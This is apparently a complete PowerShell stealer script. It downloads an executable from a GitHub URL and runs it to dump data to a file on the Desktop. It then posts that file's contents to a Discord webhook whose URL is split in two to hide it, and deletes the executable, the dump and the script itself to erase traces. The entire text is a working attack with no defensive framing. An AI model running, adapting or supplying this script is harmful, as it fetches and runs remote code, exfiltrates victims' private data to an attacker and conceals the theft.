Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$HOME\Desktop\p.exe";
Start-Sleep -Seconds 2;
& $HOME\Desktop\p.exe /stab "$HOME\Desktop\_";
Start-Sleep -Seconds 1;
$webhook = "https://discord.com/api/webhooks/1065316126009069628/JTqm-qYap-5eKJ7M1CZRfWY_";

$payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
Invoke-RestMethod -URI ($webhook + "aq0yM6LQaDCkvYfwoh7ZmlSGP2nQu8wm2jTCreFBKAxY") -Method Post -Body $payload;
Remove-Item -Path "$HOME\Desktop\p.exe";
Remove-Item -Path "$HOME\Desktop\_";
Start PowerShell {"Remove-Item -Path $HOME\Desktop\b.ps1"};
